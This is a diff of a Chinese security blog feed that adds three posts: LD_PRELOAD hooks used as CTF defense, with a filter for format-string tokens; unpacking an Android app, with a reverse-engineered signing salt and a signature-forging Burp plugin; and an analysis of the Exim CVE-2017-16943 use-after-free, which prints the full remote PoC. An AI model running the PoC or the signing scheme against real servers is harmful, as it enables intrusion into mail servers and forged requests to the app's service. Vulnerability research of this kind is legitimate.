@@ -3,6 +3,44 @@
   
     
     <entry>
+      <title><![CDATA[使用LD_PRELOAD防御pwn]]></title>
+      <url>/2017/12/23/defense_pwn_with_ld_preload.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文介绍使用 <code>LD_PRELOAD</code> 防御 线下赛中常见的漏洞。</p>
+<p>github上的相关项目：</p>
+<p><code>hook</code> 了常用的函数</p>
+<p><a href="https://github.com/poliva/ldpreloadhook" target="_blank" rel="external">https://github.com/poliva/ldpreloadhook</a></p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>由于可能会不允许加载 <code>脚本</code> ,所以用 <code>c</code> 来加载（可能需要加一些没有的东西凑大小）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;  </div><div class="line">#include &lt;unistd.h&gt;  </div><div class="line">  </div><div class="line">int main(int arg,char **args)  </div><div class="line">&#123;  </div><div class="line">  </div><div class="line">    char *argv[]=&#123;&quot;test&quot;,NULL&#125;;//传递给执行文件的参数数组，这里包含执行文件的参数   </div><div class="line">  </div><div class="line">    char *envp[]=&#123;&quot;LD_PRELOAD=./libmy_printf.so&quot;,NULL&#125;;//传递给执行文件新的环境变量数组  </div><div class="line">  </div><div class="line">    execve(&quot;./test&quot;,argv,envp);  </div><div class="line">   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>执行当前目录的 <code>test</code> 文件，同时设置 <code>LD_PRELOAD=./libmy_printf.so</code>,  运行时加载 <code>libmy_printf.so</code></p>
+<p>.</p>
+<p><strong>堆相关漏洞</strong></p>
+<p>使用 <a href="https://github.com/DhavalKapil/libdheap" target="_blank" rel="external">https://github.com/DhavalKapil/libdheap</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;  </div><div class="line">#include &lt;unistd.h&gt;  </div><div class="line">  </div><div class="line">int main(int arg,char **args)  </div><div class="line">&#123;  </div><div class="line">  </div><div class="line">    char *argv[]=&#123;&quot;test&quot;,NULL&#125;;//传递给执行文件的参数数组，这里包含执行文件的参数   </div><div class="line">  </div><div class="line">	char *envp[]=&#123;&quot;LD_PRELOAD=./libdheap.so&quot;, &quot;LIBDHEAP_EXIT_ON_ERROR=1&quot;,NULL&#125;;//传递给执行文件新的环境变量数组  </div><div class="line">    execve(&quot;./test&quot;,argv,envp);  </div><div class="line">   </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><code>LIBDHEAP_EXIT_ON_ERROR=1</code>  检测到异常后就会退出。</p>
+<p><strong>格式化字符串</strong></p>
+<p>hook printf 过滤关键字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">#define _GNU_SOURCE</div><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdarg.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">// gcc -shared -fPIC my_printf.c -o libmy_printf.so -ldl</div><div class="line"></div><div class="line"></div><div class="line">void str_remove(char *src, char *target)&#123;</div><div class="line"></div><div class="line">        char *p;    </div><div class="line">        char c[81];</div><div class="line">        char *dst[254]=&#123;0&#125;;</div><div class="line">        while((p = strstr(src,target)) != NULL) &#123; //strstr 找不到返回 NULL </div><div class="line">                *p = &apos;\0&apos;; // 指定连接下一步（连接函数）之前 a 的终止位置； </div><div class="line">                strcpy (c, p+strlen(target)); // strcat 函数中的两个传入参数的内存地址不能重叠，所以这里用 c 当作 temp </div><div class="line">                strcat (src, c);</div><div class="line">        &#125; </div><div class="line"></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">int printf(const char *format, ...)</div><div class="line">&#123;</div><div class="line">        va_list list;</div><div class="line">        char *parg;</div><div class="line">        typeof(printf) *old_printf;</div><div class="line"></div><div class="line">        char *tmp = malloc(strlen(format) + 1);</div><div class="line">        strcpy(tmp, format);</div><div class="line"></div><div class="line">        /*</div><div class="line"></div><div class="line">        remove some bad string</div><div class="line"></div><div class="line">        */</div><div class="line">        str_remove(tmp, &quot;$p&quot;);</div><div class="line">        str_remove(tmp, &quot;$x&quot;);</div><div class="line">        str_remove(tmp, &quot;hn&quot;);</div><div class="line"></div><div class="line">        // format variable arguments</div><div class="line">        va_start(list, tmp);</div><div class="line">        vasprintf(&amp;parg, tmp, list);</div><div class="line">        va_end(list);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">        // get a pointer to the function &quot;printf&quot;</div><div class="line">        old_printf = dlsym(RTLD_NEXT, &quot;printf&quot;);</div><div class="line">        (*old_printf)(&quot;%s&quot;, parg); // and we call the function with previous arguments</div><div class="line"></div><div class="line">        free(parg);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -shared -fPIC my_printf.c -o libmy_printf.so -ldl</div></pre></td></tr></table></figure></p>
+<p>编译之（<code>32</code> 位 加 <code>-m 32</code>）</p>
+]]></content>
+      
+        <categories>
+            
+            <category> ctf </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> awd </tag>
+            
+            <tag> pwn_defense </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[0ctf2017-babyheap]]></title>
       <url>/2017/12/18/0ctf2017_babyheap.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>又是一道令人怀疑人生的 <code>baby</code> 题。</p>
@@ -282,6 +320,472 @@
             <tag> rop </tag>
             
             <tag> syscall </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[安卓脱壳&&协议分析&&burp辅助分析插件编写]]></title>
+      <url>/2017/12/15/legu_android_readboy_burp.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<hr>
+<p>本文以一个 <code>app</code> 为例，演示对 <code>app</code>脱壳，然后分析其 协议加密和签名方法，然后编写 <code>burp</code> 脚本以方便后面的测试。</p>
+<p>文中涉及的文件，脱壳后的 dex 都在：</p>
+<p>链接: <a href="https://pan.baidu.com/s/1nvmUdq5" target="_blank" rel="external">https://pan.baidu.com/s/1nvmUdq5</a> 密码: isrr</p>
+<p>对于 burp 扩展和后面加解密登录数据包工具的的源码，直接用 <code>jd-gui</code> 反编译 <code>jar</code> 包即可。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先下载目标 <code>apk</code> ，然后拖到 <code>GDA</code> 里面看看有没有壳。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513337474227b39j3jxc.png?imageslim" alt="paste image"></p>
+<p>发现是腾讯加固，可以通过修改 <code>dex2oat</code> 的源码进行脱壳。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513337565769bn64zn4n.png?imageslim" alt="paste image"></p>
+<p>具体可以看: <a href="https://bbs.pediy.com/thread-210275.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-210275.htm</a></p>
+<p>脱完壳 <code>dex</code>文件，扔到 <code>jeb</code> 里面进行分析（GDA分析能力还是不太强，不过速度快）</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513337779278qey46atq.png?imageslim" alt="paste image"></p>
+<p>类和方法都出来了，脱壳成功。</p>
+<p>首先看看协议抓取，建议自己电脑起一个 <code>ap</code> （热点）， 然后用手机连接热点，对于 <code>http</code> 的数据包，可以使用 <code>burp</code> 进行抓取（对于 <code>https</code> 还要记得先安装 <code>burp</code> 的证书），对于 <code>tcp</code> 的数据包，由于我们是连接的 电脑的 <code>wifi</code> 所以我们可以直接用 <code>wireshark</code> 抓取我们网卡的数据包就能抓到手机的数据包。对于笔记本，可以买个无线网卡。</p>
+<p>首先看看注册数据包的抓取，设置好代理，选择注册功能，然后去 <code>burp</code> 里面，可以看到抓取的数据包。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513338240458s36epujq.png?imageslim" alt="paste image"></p>
+<p>对于登录数据包，点击登录功能，去发现 <code>burp</code> 无法抓到数据包， 怀疑使用了 <code>tcp</code> 发送请求数据，于是开启 <code>wireshark</code> 抓取 手机连接的热点到的网卡的数据包。抓取时间要短一些，不然找信息就很麻烦了。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513341008341rq8wpav3.png?imageslim" alt="paste image"></p>
+<p>然后我们一个一个 <code>tcp</code> 数据包查看，看看有没有什么特殊的。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513341090053skcv5yui.png?imageslim" alt="paste image"><br>发现一个数据包里面有 <code>base64</code> 加密的数据，猜测这个应该就是登陆的数据包。查了一下 <code>ip</code> ，应该就是了。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513341353754c2w3pkwy.png?imageslim" alt="paste image"></p>
+<p>下面针对不同类型的协议加密措施进行分析。</p>
+<p><strong>HTTP协议</strong></p>
+<p>协议分析关键是找到加密解密的函数，可以使用关键字搜索定位。为了方便搜索，先把 <code>dex</code> 转成 <code>smali</code> 然后用文本搜索工具搜索就行了，我使用 <code>android killer</code>。在这里可以使用 <code>sn</code> ， <code>verify</code> 等关键词进行搜索，定位关键代码。我选择了  <code>verify</code> ，因为它搜出的结果较少。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513341792672zmzhh519.png?imageslim" alt="paste image"><br>函数没经过混淆，看函数名就可以大概猜出了作用，找到关键方法，拿起 <code>jeb</code> 分析之。<br>先来看看 <code>LoginReg2_Activity</code> 的 <code>onCreate</code> 方法。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513341951766jsqhhzy2.png?imageslim" alt="paste image"></p>
+<p>获取手机号进入了 <code>XHttpApi.getVerify</code> 方法，跟进</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151334205737726n8kfgz.png?imageslim" alt="paste image"><br>先调用了 <code>XHttpApi.addSnToParams(params)</code> （看名称估计他就是增加签名的函数了），然后发送 <code>post</code> 请求。</p>
+<p>继续跟进 <code>XHttpApi.addSnToParams</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15133421932295dvpmsnb.png?imageslim" alt="paste image"><br>至此签名方案非常清晰了。</p>
+<ul>
+<li>获取时间戳,新增一个 <code>t</code> 的参数，值为 时间戳</li>
+<li><code>md5(&quot;AndroidWear65cbcdeef24de25e5ed45338f06a1b37&quot; + time_stamp)</code> 为 <code>sn</code></li>
+</ul>
+<p>由于有时间戳和签名的存在，而且服务器会检测时间戳，后续如果我们想测试一些东西，就需要过一段时间就要计算一下 签名和时间戳，这样非常麻烦，我们可以使用 <code>burp</code> 编写插件，自动的修改 时间戳和 签名，这样可以大大的减少我们的工作量。</p>
+<p>看看关键的源代码</p>
+<p>首先注册一个 <code>HttpListener</code>, 这样 <code>burp</code> 的流量就会经过我们的扩展。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513342650132r1v1tcbd.png?imageslim" alt="paste image"><br>然后看看 <code>processHttpMessage</code>对流经扩展的流量进行处理的逻辑。只处理 <code>http</code> 请求的数据，然后根据域名过滤处理的数据包，只对 <code>wear.readboy.com</code> 进行处理。接着对于数据包中的 <code>t</code> 参数和 <code>sn</code> 参数进行重新计算，并且修改 数据包中的对应值。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513342872069y1xwfms2.png?imageslim" alt="paste image"><br>加载扩展，以后重放数据包，就不用管签名的问题了。</p>
+<p><strong>TCP</strong></p>
+<p>对于 <code>tcp</code> 的协议可以通过搜索 端口号，<code>ip</code> 地址等进行定位，这里搜索 <code>端口号</code>（这里是<code>8866</code>, 可以在 <code>wireshark</code> 中查看），有一点要注意，程序中可能会用 <code>16</code> 进制或者 <code>10</code> 进制表示端口号为了，保险起见建议两种表示方式都搜一下。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513343281055sjrlbm36.png?imageslim" alt="paste image"></p>
+<p>通过搜索 <code>0x22a2</code> （<code>8866</code> 的 <code>16</code> 进制表示）找到两个可能的位置。分别检查发现 第二个没啥用，在 <code>jeb</code> 中查找交叉引用都没有，于是忽略之。然后看看第一个。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513343724882zalp55el.png?imageslim" alt="paste image"><br>可以看到 <code>jeb</code> 把端口号都转成了 <code>10</code> 进制数，这里与服务器进行了连接，没有什么有用的信息。于是上下翻翻了这个类里面的函数发现一个有意思的函数。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15133438596375b7az3lq.png?imageslim" alt="paste image"><br>用于发送数据，里面还用了另外一个类的方法，一个一个看，找到了加密方法。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513343943270gionovo1.png?imageslim" alt="paste image"></p>
+<p>就是简单的 <code>rc4</code> 加密，然后在 <code>base64</code> 编码。<br>为了测试的方便写了个图形化的解密软件。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513344074547va5a339l.png?imageslim" alt="paste image"></p>
+<p>用 <code>nc</code> 测试之</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513344169166j8m5j980.png?imageslim" alt="paste image"><br>正确。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>不要怕麻烦，一些东西尽早脚本化，自动化，减轻工作量。逆向分析，搜索关键字，定位关键代码。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.vuln.cn/6100" target="_blank" rel="external">http://www.vuln.cn/6100</a></p>
+<p><a href="http://www.freebuf.com/articles/terminal/106673.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/106673.html</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 安卓安全 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> protocol analysis </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[exim CVE-2017-16943 uaf漏洞分析]]></title>
+      <url>/2017/12/14/exim_CVE_2017_16943_uaf_pwn.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<hr>
+<p>这是最近爆出来的 <code>exim</code> 的一个 <code>uaf</code> 漏洞，可以进行远程代码执行。本文对该漏洞和作者给出的 <code>poc</code> 进行分析。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>环境搭建</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># 从github上拉取源码</div><div class="line">$ git clone https://github.com/Exim/exim.git</div><div class="line"># 在4e6ae62分支修补了UAF漏洞，所以把分支切换到之前的178ecb：</div><div class="line">$ git checkout ef9da2ee969c27824fcd5aed6a59ac4cd217587b</div><div class="line"># 安装相关依赖</div><div class="line">$ apt install libdb-dev libpcre3-dev</div><div class="line"># 获取meh提供的Makefile文件，放到Local目录下，如果没有则创建该目录</div><div class="line">$ cd src</div><div class="line">$ mkdir Local</div><div class="line">$ cd Local</div><div class="line">$ wget &quot;https://bugs.exim.org/attachment.cgi?id=1051&quot; -O Makefile</div><div class="line">$ cd ..</div><div class="line"># 修改Makefile文件的第134行，把用户修改为当前服务器上存在的用户，然后编译安装</div><div class="line">$ make &amp;&amp; make install</div></pre></td></tr></table></figure>
+<p>注：</p>
+<p><em>如果要编译成 <code>debug</code> 模式，在 <code>Makefile</code> 找个位置 加上 <code>-g</code> 。（比如 <code>CFLAGS</code>, 或者 <code>gcc</code> 路径处）</em></p>
+<p>安装完后 ,修改 <code>/etc/exim/configure</code> 文件的第 <code>364</code> 行，把 <code>accept hosts = :</code> 修改成 <code>accept hosts = *</code></p>
+<p>然后使用 <code>/usr/exim/bin/exim -bdf -d+all</code> 运行即可。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513257523377oq8q35os.png?imageslim" alt="paste image"></p>
+<p><strong>漏洞分析</strong></p>
+<p>首先谈谈 <code>exim</code> 自己实现的 <code>堆管理</code> 机制.相关代码位于 <code>store.c</code>.<br>其中重要函数的作用</p>
+<ul>
+<li><code>store_get_3</code> : 分配内存</li>
+<li><code>store_extend_3</code>: 扩展堆内存</li>
+<li><code>store_release_3</code>: 释放堆内存</li>
+</ul>
+<p><code>exim</code> 使用 <code>block pool</code> 来管理内存。其中共有 3 个 <code>pool</code>,以枚举变量定义.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">enum &#123; POOL_MAIN, POOL_PERM, POOL_SEARCH &#125;;</div></pre></td></tr></table></figure></p>
+<p>程序则通过 <code>store_pool</code> 来决定使用哪个 <code>pool</code> 来分配内存。不同的 <code>pool</code> 相互独立。</p>
+<p>有一些全局变量要注意。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">//管理每个 block 链表的首节点</div><div class="line">static storeblock *chainbase[3] = &#123; NULL, NULL, NULL &#125;;</div><div class="line"></div><div class="line">// 每一项是所属 pool中,目前提供的内存分配的 current_block 的指针</div><div class="line">// 即内存管理是针对 current_block 的。</div><div class="line">static storeblock *current_block[3] = &#123; NULL, NULL, NULL &#125;;</div><div class="line"></div><div class="line">// current_block 空闲内存的起始地址。每一项代表每一个</div><div class="line">// pool 中的 current_block 的相应值</div><div class="line">static void *next_yield[3] = &#123; NULL, NULL, NULL &#125;;</div><div class="line"></div><div class="line">// current_block 中空闲内存的大小， 每一项代表每一个</div><div class="line">// pool 中的 current_block 的相应值</div><div class="line">static int yield_length[3] = &#123; -1, -1, -1 &#125;;</div><div class="line"></div><div class="line">// 上一次分配获得的 内存地址</div><div class="line">//每一项代表每一个pool 中的 current_block 的相应值</div><div class="line">void *store_last_get[3] = &#123; NULL, NULL, NULL &#125;;</div></pre></td></tr></table></figure>
+<p><code>block</code> 的结构<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15132607491657xt9urak.png?imageslim" alt="paste image"></p>
+<p>每一个 <code>pool</code> 中的 <code>block</code>通过 <code>next</code> 指针链接起来</p>
+<p>大概的结构图如下</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513262786424ik0joztb.png?imageslim" alt="paste image"></p>
+<p><code>block</code> 的 <code>next</code> 和 <code>length</code> 域以下（偏移 <code>0x10</code>（64位）），用于内存分配（<code>0x2000</code> 字节）。</p>
+<p>先来看看 <code>store_get_3</code>，该函数用于内存请求。<br>首次使用会先调用 <code>store_malloc</code> 使用 系统的 <code>malloc</code> 分配 <code>0x2000</code> 大小内存块，这也是 <code>block</code> 的默认大小，并将这个内存块作为 <code>current_block</code> 。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15132593592238uznra2a.png?imageslim" alt="paste image"></p>
+<p>如果 <code>block</code> 中的剩余大小足够的话，通过调整 <code>next_yield</code>, <code>yield_length</code>, <code>store_last_get</code>直接切割内存块，然后返回 <code>store_last_get</code> 即可。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513259525324mnzqf4wm.png?imageslim" alt="paste image"></p>
+<p>如果 <code>block</code> 中的内存不够，就用 <code>store_malloc</code> 另外分配一块，并将这个内存块作为 <code>current_block</code>，然后再进行切割。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513259887575q7snuezu.png?imageslim" alt="paste image"></p>
+<p>然后是 <code>store_extend_3</code> 函数<br>首先会进行校验，要求 <code>store_last_get</code> 和 <code>next_yield</code> 要连续，也就是待合并的块与 <code>next_yield</code>  要紧挨着，类似于</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513260406403tt6u0txr.png?imageslim" alt="paste image"></p>
+<p>而且剩余内存大小也要能满足需要</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513260445596wawuzkgx.png?imageslim" alt="paste image"></p>
+<p>如果条件满足直接修改全局变量，切割内存块即可.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513260486599jom5fys3.png?imageslim" alt="paste image"></p>
+<p><code>store_release_3</code> 函数<br>找到目标地址所在 <code>block</code> ，然后调用 <code>free</code> 释放掉即可</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15132605729110y3w7k0o.png?imageslim" alt="paste image"></p>
+<p>下面正式进入漏洞分析<br>漏洞位于 <code>receive.c</code> 的 <code>receive_msg</code> 函数。</p>
+<p>漏洞代码</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513260852552v7wf4k6r.png?imageslim" alt="paste image"></p>
+<p>这个函数用于处理客户端提交的 <code>exim</code> 命令， <code>ptr</code> 表示当前以及接收的命令的字符数， <code>header_size</code> 为一个 阈值，初始为 <code>0x100</code> , 当 <code>ptr</code> &gt; <code>header_size-4</code> 时， <code>header_size</code>翻倍，然后扩展内存，以存储更多的字符串。</p>
+<p>如果 <code>next-&gt;text</code> 与 <code>next_yield</code> 之间有另外的内存分配，或者 <code>next-&gt;text</code> 所在块没有足够的空间用来扩展，就会使用 <code>store_get</code> 获取内存，如果空间不够，就会调用 <code>malloc</code> 分配内存，然后复制内容到新分配的内存区域，最后释放掉原来的内存区域。</p>
+<p>一切都看起来很平常，下面看看漏洞的原理。</p>
+<p><code>store_get</code> 分配到的是 <code>block</code>中的一小块内存（<code>store</code>）, 然而 <code>store_release_3</code> 则会释放掉 一整个 <code>block</code> 的内存。<br>如果我们在进入该流程时，把 <code>block</code> 布局成类似这样.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15132995469411a9h83rg.png?imageslim" alt="paste image"></p>
+<p>因为 <code>next-&gt;text</code>  和 空闲块之间 有内存的分配，所以 <code>store_extend_3</code> 就会失败，进入 <code>store_get</code> 分配内存.</p>
+<p>如果 <code>free memory</code> 区域内存能够满足需要， 那么就会从 <code>free memory</code> 区域 切割内存返回，然后会拷贝内容，最后 <code>store_release(next-&gt;text)</code>, 此时会把 整个 <code>block</code> 释放掉，这样一来 <code>next-&gt;text</code> ,<code>current_block</code> 都指向了一块已经释放掉的内存，如果以后有使用到这块内存的话, 就是 <code>UAF</code> 了。</p>
+<p>大概流程如下<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513299429816blx4y8vg.png?imageslim" alt="paste image"><br>接下来，分析一下 <code>poc</code>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"># CVE-2017-16943 PoC by meh at DEVCORE</div><div class="line"># pip install pwntools</div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">r = remote(&apos;localhost&apos;, 25)</div><div class="line"></div><div class="line">r.recvline()</div><div class="line">r.sendline(&quot;EHLO test&quot;)</div><div class="line">r.recvuntil(&quot;250 HELP&quot;)</div><div class="line">r.sendline(&quot;MAIL FROM:&lt;&gt;&quot;)</div><div class="line">r.recvline()</div><div class="line">r.sendline(&quot;RCPT TO:&lt;meh@some.domain&gt;&quot;)</div><div class="line">r.recvline()</div><div class="line"></div><div class="line"></div><div class="line">pause()</div><div class="line"></div><div class="line">r.sendline(&apos;a&apos;*0x1280+&apos;\x7f&apos;)</div><div class="line"></div><div class="line">log.info(&quot;new heap on top chunk....&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">r.recvuntil(&apos;command&apos;)</div><div class="line">r.sendline(&apos;DATA&apos;)</div><div class="line">r.recvuntil(&apos;itself\r\n&apos;)</div><div class="line">r.sendline(&apos;b&apos;*0x4000+&apos;:\r\n&apos;)</div><div class="line">log.info(&quot;use DATA to create unsorted bin, next want to let next-&gt;txt ----&gt; block_base&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">r.sendline(&apos;.\r\n&apos;)</div><div class="line">r.sendline(&apos;.\r\n&apos;)</div><div class="line">r.recvline()</div><div class="line">r.sendline(&quot;MAIL FROM:&lt;&gt;&quot;)</div><div class="line">r.recvline()</div><div class="line">r.sendline(&quot;RCPT TO:&lt;meh@some.domain&gt;&quot;)</div><div class="line">r.recvline()</div><div class="line">r.sendline(&apos;a&apos;*0x3480+&apos;\x7f&apos;)</div><div class="line"></div><div class="line">log.info(&quot;new heap on top chunk....  again&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">r.recvuntil(&apos;command&apos;)</div><div class="line">r.sendline(&apos;BDAT 1&apos;)</div><div class="line">r.sendline(&apos;:BDAT \x7f&apos;)</div><div class="line"></div><div class="line">log.info(&quot;make hole&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">s = &apos;a&apos;*0x1c1e + p64(0x41414141)*(0x1e00/8)</div><div class="line"></div><div class="line">r.send(s+ &apos;:\r\n&apos;)</div><div class="line">r.send(&apos;\n&apos;)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<p>漏洞利用的原理在于，<code>block</code> 结构体的 <code>next</code> 和 <code>length</code>域恰好位于 <code>malloc chunk</code> 的 <code>fd</code> 和 <code>bk</code> 指针区域，如果我们能在触发漏洞时把 这个 <code>chunk</code> 放到 <code>unsorted bin</code> 中，<code>block</code> 结构体的 <code>next</code> 和 <code>length</code>就会变成 <code>main_arena</code> 中的地址，然后再次触发 <code>store_get</code> ，就会从 <code>main_arena</code> 中切割内存块返回给我们，我们就能修改 <code>main_arena</code>  中的数据了。可以改掉 <code>__free_hook</code> 来控制 <code>eip</code>.</p>
+<p>继续往下之前，还有一个点需要说一下。</p>
+<p>当 <code>exim</code> 获得客户端连接后，首先调用 <code>smtp_setup_msg</code> 获取命令，如果获取到的是 <strong>无法识别</strong> 的命令，就会调用 <code>string_printing</code> 函数。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513301558543vaj00d9h.png?imageslim" alt="paste image"></p>
+<p>这个函数内部会调用 <code>store_get</code> 保存字符串.</p>
